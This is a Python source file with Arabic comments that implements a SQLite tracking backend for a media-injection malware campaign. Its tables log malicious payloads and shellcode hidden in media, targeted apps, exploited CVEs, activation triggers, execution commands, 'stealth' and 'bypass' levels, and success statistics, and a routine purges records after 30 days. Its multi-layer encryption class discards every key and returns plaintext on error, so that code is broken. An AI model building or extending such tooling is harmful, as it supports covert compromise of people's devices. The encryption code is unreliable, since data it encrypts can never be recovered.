# قاعدة بيانات حقن الوسائط المتقدم
# أقوى الثغرات والأدوات والوسائل

import sqlite3
import json
import hashlib
import hmac
import secrets
import time
import logging
import os
import base64
from datetime import datetime, timedelta
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

class MediaInjectionDatabase:
    """قاعدة بيانات حقن الوسائط المتقدم"""
    
    def __init__(self, db_file='media_injection.db'):
        self.db_file = db_file
        self.logger = self.setup_logger()
        self.crypto_engine = AdvancedCryptoEngine()
        self.init_database()
    
    def setup_logger(self):
        """إعداد نظام التسجيل المتقدم"""
        logger = logging.getLogger('MediaInjectionDatabase')
        logger.setLevel(logging.DEBUG)
        
        # تشفير السجلات
        handler = logging.FileHandler('media_injection_database.log')
        handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
        logger.addHandler(handler)
        
        return logger
    
    def init_database(self):
        """تهيئة قاعدة البيانات"""
        try:
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.cursor()
                
                # جدول سجلات الحقن
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS injection_records (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        injection_id TEXT UNIQUE NOT NULL,
                        device_id TEXT NOT NULL,
                        target_app TEXT NOT NULL,
                        media_type TEXT NOT NULL,
                        payload_type TEXT NOT NULL,
                        injection_status TEXT DEFAULT 'pending',
                        injection_timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                        activation_timestamp DATETIME,
                        execution_status TEXT DEFAULT 'pending',
                        execution_result TEXT,
                        error_message TEXT,
                        encryption_key TEXT,
                        obfuscation_level INTEGER DEFAULT 3,
                        stealth_level INTEGER DEFAULT 5,
                        bypass_level INTEGER DEFAULT 4,
                        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
                    )
                ''')
                
                # جدول الوسائط المحقونة
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS injected_media (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        injection_id TEXT NOT NULL,
                        media_file_path TEXT NOT NULL,
                        media_file_size INTEGER,
                        media_file_hash TEXT,
                        media_file_type TEXT,
                        media_encrypted_data BLOB,
                        media_obfuscated_data BLOB,
                        media_protected_data BLOB,
                        steganography_method TEXT,
                        steganography_key TEXT,
                        watermark_data TEXT,
                        metadata TEXT,
                        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                        FOREIGN KEY (injection_id) REFERENCES injection_records (injection_id)
                    )
                ''')
                
                # جدول الحمولات الخبيثة
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS malicious_payloads (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        injection_id TEXT NOT NULL,
                        payload_type TEXT NOT NULL,
                        payload_data BLOB,
                        payload_encrypted_data BLOB,
                        payload_shellcode BLOB,
                        payload_exploits TEXT,
                        payload_vulnerabilities TEXT,
                        payload_obfuscation TEXT,
                        payload_protection TEXT,
                        payload_activation_triggers TEXT,
                        payload_execution_method TEXT,
                        payload_stealth_level INTEGER DEFAULT 5,
                        payload_bypass_level INTEGER DEFAULT 4,
                        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                        FOREIGN KEY (injection_id) REFERENCES injection_records (injection_id)
                    )
                ''')
                
                # جدول التطبيقات المستهدفة
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS target_apps (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        app_package_name TEXT UNIQUE NOT NULL,
                        app_name TEXT NOT NULL,
                        app_version TEXT,
                        app_vulnerabilities TEXT,
                        app_injection_methods TEXT,
                        app_permissions TEXT,
                        app_stealth_level INTEGER DEFAULT 3,
                        app_bypass_level INTEGER DEFAULT 3,
                        app_success_rate REAL DEFAULT 0.0,
                        app_last_used DATETIME,
                        app_created_at DATETIME DEFAULT CURRENT_TIMESTAMP
                    )
                ''')
                
                # جدول الثغرات المستغلة
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS exploited_vulnerabilities (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        injection_id TEXT NOT NULL,
                        vulnerability_name TEXT NOT NULL,
                        vulnerability_type TEXT NOT NULL,
                        vulnerability_cve TEXT,
                        vulnerability_severity TEXT,
                        vulnerability_exploit_data BLOB,
                        vulnerability_success BOOLEAN DEFAULT FALSE,
                        vulnerability_error_message TEXT,
                        vulnerability_exploited_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                        FOREIGN KEY (injection_id) REFERENCES injection_records (injection_id)
                    )
                ''')
                
                # جدول محفزات التنشيط
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS activation_triggers (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        injection_id TEXT NOT NULL,
                        trigger_type TEXT NOT NULL,
                        trigger_condition TEXT,
                        trigger_data TEXT,
                        trigger_status TEXT DEFAULT 'active',
                        trigger_executed BOOLEAN DEFAULT FALSE,
                        trigger_executed_at DATETIME,
                        trigger_result TEXT,
                        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                        FOREIGN KEY (injection_id) REFERENCES injection_records (injection_id)
                    )
                ''')
                
                # جدول سجلات التنفيذ
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS execution_logs (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        injection_id TEXT NOT NULL,
                        execution_type TEXT NOT NULL,
                        execution_command TEXT,
                        execution_data TEXT,
                        execution_status TEXT,
                        execution_result TEXT,
                        execution_error TEXT,
                        execution_timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                        execution_duration REAL,
                        FOREIGN KEY (injection_id) REFERENCES injection_records (injection_id)
                    )
                ''')
                
                # جدول إحصائيات الحقن
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS injection_statistics (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        date DATE UNIQUE NOT NULL,
                        total_injections INTEGER DEFAULT 0,
                        successful_injections INTEGER DEFAULT 0,
                        failed_injections INTEGER DEFAULT 0,
                        pending_injections INTEGER DEFAULT 0,
                        total_executions INTEGER DEFAULT 0,
                        successful_executions INTEGER DEFAULT 0,
                        failed_executions INTEGER DEFAULT 0,
                        average_execution_time REAL,
                        most_used_payload_type TEXT,
                        most_targeted_app TEXT,
                        most_exploited_vulnerability TEXT,
                        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
                    )
                ''')
                
                # إنشاء الفهارس
                cursor.execute('CREATE INDEX IF NOT EXISTS idx_injection_records_device_id ON injection_records (device_id)')
                cursor.execute('CREATE INDEX IF NOT EXISTS idx_injection_records_status ON injection_records (injection_status)')
                cursor.execute('CREATE INDEX IF NOT EXISTS idx_injection_records_timestamp ON injection_records (injection_timestamp)')
                cursor.execute('CREATE INDEX IF NOT EXISTS idx_injected_media_injection_id ON injected_media (injection_id)')
                cursor.execute('CREATE INDEX IF NOT EXISTS idx_malicious_payloads_injection_id ON malicious_payloads (injection_id)')
                cursor.execute('CREATE INDEX IF NOT EXISTS idx_exploited_vulnerabilities_injection_id ON exploited_vulnerabilities (injection_id)')
                cursor.execute('CREATE INDEX IF NOT EXISTS idx_activation_triggers_injection_id ON activation_triggers (injection_id)')
                cursor.execute('CREATE INDEX IF NOT EXISTS idx_execution_logs_injection_id ON execution_logs (injection_id)')
                
                conn.commit()
                self.logger.info("تم تهيئة قاعدة البيانات بنجاح")
                
        except Exception as e:
            self.logger.error(f"خطأ في تهيئة قاعدة البيانات: {str(e)}")
    
    def save_injection_record(self, injection_data):
        """حفظ سجل الحقن"""
        try:
            injection_id = injection_data.get('injection_id')
            device_id = injection_data.get('device_id')
            target_app = injection_data.get('target_app')
            media_type = injection_data.get('media_type')
            payload_type = injection_data.get('payload_type')
            encryption_key = injection_data.get('encryption_key')
            obfuscation_level = injection_data.get('obfuscation_level', 3)
            stealth_level = injection_data.get('stealth_level', 5)
            bypass_level = injection_data.get('bypass_level', 4)
            
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.cursor()
                
                cursor.execute('''
                    INSERT INTO injection_records (
                        injection_id, device_id, target_app, media_type, payload_type,
                        encryption_key, obfuscation_level, stealth_level, bypass_level
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    injection_id, device_id, target_app, media_type, payload_type,
                    encryption_key, obfuscation_level, stealth_level, bypass_level
                ))
                
                conn.commit()
                self.logger.info(f"تم حفظ سجل الحقن: {injection_id}")
                return True
                
        except Exception as e:
            self.logger.error(f"خطأ في حفظ سجل الحقن: {str(e)}")
            return False
    
    def get_injection_status(self, injection_id):
        """الحصول على حالة الحقن"""
        try:
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.cursor()
                
                cursor.execute('''
                    SELECT injection_status, injection_timestamp, activation_timestamp,
                           execution_status, execution_result, error_message
                    FROM injection_records
                    WHERE injection_id = ?
                ''', (injection_id,))
                
                result = cursor.fetchone()
                if result:
                    return {
                        'injection_status': result[0],
                        'injection_timestamp': result[1],
                        'activation_timestamp': result[2],
                        'execution_status': result[3],
                        'execution_result': result[4],
                        'error_message': result[5]
                    }
                else:
                    return None
                    
        except Exception as e:
            self.logger.error(f"خطأ في الحصول على حالة الحقن: {str(e)}")
            return None
    
    def update_injection_status(self, injection_id, status, result=None, error=None):
        """تحديث حالة الحقن"""
        try:
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.cursor()
                
                if status == 'activated':
                    cursor.execute('''
                        UPDATE injection_records
                        SET injection_status = ?, activation_timestamp = CURRENT_TIMESTAMP,
                            updated_at = CURRENT_TIMESTAMP
                        WHERE injection_id = ?
                    ''', (status, injection_id))
                elif status == 'executed':
                    cursor.execute('''
                        UPDATE injection_records
                        SET execution_status = ?, execution_result = ?, error_message = ?,
                            updated_at = CURRENT_TIMESTAMP
                        WHERE injection_id = ?
                    ''', (status, result, error, injection_id))
                else:
                    cursor.execute('''
                        UPDATE injection_records
                        SET injection_status = ?, updated_at = CURRENT_TIMESTAMP
                        WHERE injection_id = ?
                    ''', (status, injection_id))
                
                conn.commit()
                self.logger.info(f"تم تحديث حالة الحقن: {injection_id} -> {status}")
                return True
                
        except Exception as e:
            self.logger.error(f"خطأ في تحديث حالة الحقن: {str(e)}")
            return False
    
    def get_pending_injections(self, device_id=None):
        """الحصول على الحقن المعلقة"""
        try:
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.cursor()
                
                if device_id:
                    cursor.execute('''
                        SELECT injection_id, device_id, target_app, media_type, payload_type,
                               injection_timestamp, obfuscation_level, stealth_level, bypass_level
                        FROM injection_records
                        WHERE injection_status = 'pending' AND device_id = ?
                        ORDER BY injection_timestamp ASC
                    ''', (device_id,))
                else:
                    cursor.execute('''
                        SELECT injection_id, device_id, target_app, media_type, payload_type,
                               injection_timestamp, obfuscation_level, stealth_level, bypass_level
                        FROM injection_records
                        WHERE injection_status = 'pending'
                        ORDER BY injection_timestamp ASC
                    ''')
                
                results = cursor.fetchall()
                pending_injections = []
                
                for result in results:
                    pending_injections.append({
                        'injection_id': result[0],
                        'device_id': result[1],
                        'target_app': result[2],
                        'media_type': result[3],
                        'payload_type': result[4],
                        'injection_timestamp': result[5],
                        'obfuscation_level': result[6],
                        'stealth_level': result[7],
                        'bypass_level': result[8]
                    })
                
                return pending_injections
                
        except Exception as e:
            self.logger.error(f"خطأ في الحصول على الحقن المعلقة: {str(e)}")
            return []
    
    def save_injected_media(self, injection_id, media_data):
        """حفظ الوسائط المحقونة"""
        try:
            media_file_path = media_data.get('file_path')
            media_file_size = media_data.get('file_size', 0)
            media_file_type = media_data.get('file_type', '')
            media_encrypted_data = media_data.get('encrypted_data')
            media_obfuscated_data = media_data.get('obfuscated_data')
            media_protected_data = media_data.get('protected_data')
            steganography_method = media_data.get('steganography_method')
            steganography_key = media_data.get('steganography_key')
            watermark_data = media_data.get('watermark_data')
            metadata = media_data.get('metadata')
            
            # حساب hash الملف
            media_file_hash = hashlib.sha256(media_protected_data).hexdigest() if media_protected_data else ''
            
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.cursor()
                
                cursor.execute('''
                    INSERT INTO injected_media (
                        injection_id, media_file_path, media_file_size, media_file_hash,
                        media_file_type, media_encrypted_data, media_obfuscated_data,
                        media_protected_data, steganography_method, steganography_key,
                        watermark_data, metadata
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    injection_id, media_file_path, media_file_size, media_file_hash,
                    media_file_type, media_encrypted_data, media_obfuscated_data,
                    media_protected_data, steganography_method, steganography_key,
                    watermark_data, metadata
                ))
                
                conn.commit()
                self.logger.info(f"تم حفظ الوسائط المحقونة: {injection_id}")
                return True
                
        except Exception as e:
            self.logger.error(f"خطأ في حفظ الوسائط المحقونة: {str(e)}")
            return False
    
    def save_malicious_payload(self, injection_id, payload_data):
        """حفظ الحمولة الخبيثة"""
        try:
            payload_type = payload_data.get('payload_type')
            payload_data_blob = payload_data.get('payload_data')
            payload_encrypted_data = payload_data.get('payload_encrypted_data')
            payload_shellcode = payload_data.get('payload_shellcode')
            payload_exploits = json.dumps(payload_data.get('payload_exploits', []))
            payload_vulnerabilities = json.dumps(payload_data.get('payload_vulnerabilities', []))
            payload_obfuscation = json.dumps(payload_data.get('payload_obfuscation', {}))
            payload_protection = json.dumps(payload_data.get('payload_protection', {}))
            payload_activation_triggers = json.dumps(payload_data.get('payload_activation_triggers', {}))
            payload_execution_method = payload_data.get('payload_execution_method')
            payload_stealth_level = payload_data.get('payload_stealth_level', 5)
            payload_bypass_level = payload_data.get('payload_bypass_level', 4)
            
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.cursor()
                
                cursor.execute('''
                    INSERT INTO malicious_payloads (
                        injection_id, payload_type, payload_data, payload_encrypted_data,
                        payload_shellcode, payload_exploits, payload_vulnerabilities,
                        payload_obfuscation, payload_protection, payload_activation_triggers,
                        payload_execution_method, payload_stealth_level, payload_bypass_level
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    injection_id, payload_type, payload_data_blob, payload_encrypted_data,
                    payload_shellcode, payload_exploits, payload_vulnerabilities,
                    payload_obfuscation, payload_protection, payload_activation_triggers,
                    payload_execution_method, payload_stealth_level, payload_bypass_level
                ))
                
                conn.commit()
                self.logger.info(f"تم حفظ الحمولة الخبيثة: {injection_id}")
                return True
                
        except Exception as e:
            self.logger.error(f"خطأ في حفظ الحمولة الخبيثة: {str(e)}")
            return False
    
    def save_exploited_vulnerability(self, injection_id, vulnerability_data):
        """حفظ الثغرة المستغلة"""
        try:
            vulnerability_name = vulnerability_data.get('vulnerability_name')
            vulnerability_type = vulnerability_data.get('vulnerability_type')
            vulnerability_cve = vulnerability_data.get('vulnerability_cve')
            vulnerability_severity = vulnerability_data.get('vulnerability_severity')
            vulnerability_exploit_data = vulnerability_data.get('vulnerability_exploit_data')
            vulnerability_success = vulnerability_data.get('vulnerability_success', False)
            vulnerability_error_message = vulnerability_data.get('vulnerability_error_message')
            
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.cursor()
                
                cursor.execute('''
                    INSERT INTO exploited_vulnerabilities (
                        injection_id, vulnerability_name, vulnerability_type,
                        vulnerability_cve, vulnerability_severity, vulnerability_exploit_data,
                        vulnerability_success, vulnerability_error_message
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    injection_id, vulnerability_name, vulnerability_type,
                    vulnerability_cve, vulnerability_severity, vulnerability_exploit_data,
                    vulnerability_success, vulnerability_error_message
                ))
                
                conn.commit()
                self.logger.info(f"تم حفظ الثغرة المستغلة: {injection_id} - {vulnerability_name}")
                return True
                
        except Exception as e:
            self.logger.error(f"خطأ في حفظ الثغرة المستغلة: {str(e)}")
            return False
    
    def save_activation_trigger(self, injection_id, trigger_data):
        """حفظ محفز التنشيط"""
        try:
            trigger_type = trigger_data.get('trigger_type')
            trigger_condition = trigger_data.get('trigger_condition')
            trigger_data_json = json.dumps(trigger_data.get('trigger_data', {}))
            trigger_status = trigger_data.get('trigger_status', 'active')
            
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.cursor()
                
                cursor.execute('''
                    INSERT INTO activation_triggers (
                        injection_id, trigger_type, trigger_condition, trigger_data, trigger_status
                    ) VALUES (?, ?, ?, ?, ?)
                ''', (injection_id, trigger_type, trigger_condition, trigger_data_json, trigger_status))
                
                conn.commit()
                self.logger.info(f"تم حفظ محفز التنشيط: {injection_id} - {trigger_type}")
                return True
                
        except Exception as e:
            self.logger.error(f"خطأ في حفظ محفز التنشيط: {str(e)}")
            return False
    
    def save_execution_log(self, injection_id, execution_data):
        """حفظ سجل التنفيذ"""
        try:
            execution_type = execution_data.get('execution_type')
            execution_command = execution_data.get('execution_command')
            execution_data_json = json.dumps(execution_data.get('execution_data', {}))
            execution_status = execution_data.get('execution_status')
            execution_result = execution_data.get('execution_result')
            execution_error = execution_data.get('execution_error')
            execution_duration = execution_data.get('execution_duration')
            
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.cursor()
                
                cursor.execute('''
                    INSERT INTO execution_logs (
                        injection_id, execution_type, execution_command, execution_data,
                        execution_status, execution_result, execution_error, execution_duration
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    injection_id, execution_type, execution_command, execution_data_json,
                    execution_status, execution_result, execution_error, execution_duration
                ))
                
                conn.commit()
                self.logger.info(f"تم حفظ سجل التنفيذ: {injection_id} - {execution_type}")
                return True
                
        except Exception as e:
            self.logger.error(f"خطأ في حفظ سجل التنفيذ: {str(e)}")
            return False
    
    def get_injection_statistics(self, date=None):
        """الحصول على إحصائيات الحقن"""
        try:
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.cursor()
                
                if date:
                    cursor.execute('''
                        SELECT * FROM injection_statistics WHERE date = ?
                    ''', (date,))
                else:
                    cursor.execute('''
                        SELECT * FROM injection_statistics ORDER BY date DESC LIMIT 30
                    ''')
                
                results = cursor.fetchall()
                statistics = []
                
                for result in results:
                    statistics.append({
                        'date': result[1],
                        'total_injections': result[2],
                        'successful_injections': result[3],
                        'failed_injections': result[4],
                        'pending_injections': result[5],
                        'total_executions': result[6],
                        'successful_executions': result[7],
                        'failed_executions': result[8],
                        'average_execution_time': result[9],
                        'most_used_payload_type': result[10],
                        'most_targeted_app': result[11],
                        'most_exploited_vulnerability': result[12]
                    })
                
                return statistics
                
        except Exception as e:
            self.logger.error(f"خطأ في الحصول على إحصائيات الحقن: {str(e)}")
            return []
    
    def cleanup_old_records(self, days=30):
        """تنظيف السجلات القديمة"""
        try:
            cutoff_date = datetime.now() - timedelta(days=days)
            
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.cursor()
                
                # حذف السجلات القديمة
                cursor.execute('''
                    DELETE FROM injection_records
                    WHERE created_at < ?
                ''', (cutoff_date,))
                
                cursor.execute('''
                    DELETE FROM injected_media
                    WHERE created_at < ?
                ''', (cutoff_date,))
                
                cursor.execute('''
                    DELETE FROM malicious_payloads
                    WHERE created_at < ?
                ''', (cutoff_date,))
                
                cursor.execute('''
                    DELETE FROM exploited_vulnerabilities
                    WHERE vulnerability_exploited_at < ?
                ''', (cutoff_date,))
                
                cursor.execute('''
                    DELETE FROM activation_triggers
                    WHERE created_at < ?
                ''', (cutoff_date,))
                
                cursor.execute('''
                    DELETE FROM execution_logs
                    WHERE execution_timestamp < ?
                ''', (cutoff_date,))
                
                conn.commit()
                self.logger.info(f"تم تنظيف السجلات القديمة (أكثر من {days} يوم)")
                return True
                
        except Exception as e:
            self.logger.error(f"خطأ في تنظيف السجلات القديمة: {str(e)}")
            return False

class AdvancedCryptoEngine:
    """محرك التشفير المتقدم"""
    
    def __init__(self):
        self.encryption_layers = 5
        self.key_size = 4096
    
    def encrypt_advanced(self, data):
        """تشفير متقدم متعدد الطبقات"""
        try:
            encrypted_data = data
            for i in range(self.encryption_layers):
                key = secrets.token_bytes(32)
                encrypted_data = self.encrypt_layer(encrypted_data, key)
            return encrypted_data
        except Exception as e:
            return data
    
    def encrypt_layer(self, data, key):
        """تشفير طبقة واحدة"""
        try:
            # استخدام AES-256-GCM
            iv = secrets.token_bytes(16)
            cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            encrypted = encryptor.update(data) + encryptor.finalize()
            return iv + encryptor.tag + encrypted
        except Exception as e:
            return data

# إنشاء نسخة من قاعدة البيانات
media_injection_database = MediaInjectionDatabase()